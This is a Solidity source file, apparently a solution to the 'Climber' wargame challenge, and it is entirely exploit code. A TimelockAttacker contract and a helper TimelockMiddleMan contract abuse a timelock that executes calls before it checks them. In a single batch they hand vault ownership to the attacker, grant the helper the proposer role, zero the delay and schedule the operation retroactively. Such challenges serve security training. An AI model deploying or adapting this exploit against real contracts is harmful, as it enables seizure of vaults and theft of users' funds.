// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;

interface IClimberTimelock {
  function schedule( address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt ) external;
  function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
}

// middle man is a proposer role to the timelock
contract TimelockMiddleMan {

  function scheduleOperation(address attacker, address vaultAddress, address timelockAddress, bytes32 salt) external {

    address[] memory targets = new address[](4);
    uint256[] memory values = new uint256[](4);
    bytes[] memory dataElements = new bytes[](4);

    targets[0] = vaultAddress;
    values[0] = 0;
    dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

    targets[1] = timelockAddress;
    values[1] = 0;
    dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

    targets[2] = timelockAddress;
    dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)",0);
    values[2] = 0;

    targets[3] = address(this);
    dataElements[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress,  timelockAddress, salt);
    values[3] = 0;

    IClimberTimelock(payable(timelockAddress)).schedule(targets, values, dataElements, salt);
  }
}

contract TimelockAttacker {
  address private _timelock;
  address private _attacker;
  address private _vault;
  TimelockMiddleMan private _middleman;

  constructor(address timelock, address vault) {
    _timelock = timelock;
    _vault = vault;
    _attacker = msg.sender;
    _middleman = new TimelockMiddleMan();
  }

  function attack() public {
    address[] memory targets = new address[](4);
    uint256[] memory values = new uint256[](4);
    bytes[] memory dataElements = new bytes[](4);
    //1. transfer ownership of the vault to the attacker
    bytes32 salt = bytes32(keccak256("attack"));

    targets[0] = _vault;
    dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", _attacker);
    values[0] = 0;

    // 2. grand proposer role to a middle man
    targets[1] = address(_timelock);
    dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, _middleman);
    values[1] = 0;

    // 3. update delay to 0
    targets[2] = address(_timelock);
    dataElements[2] = abi.encodeWithSignature("updateDelay(uint64)",0);
    values[2] = 0;

    // 4. ask middleman to schedule the operation
    targets[3] = address(_middleman);
    dataElements[3] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",_attacker, _vault, _timelock, salt);
    values[3] = 0;
    
    // 5. execute
    IClimberTimelock(payable(_timelock)).execute(targets, values, dataElements, salt);
  }
}
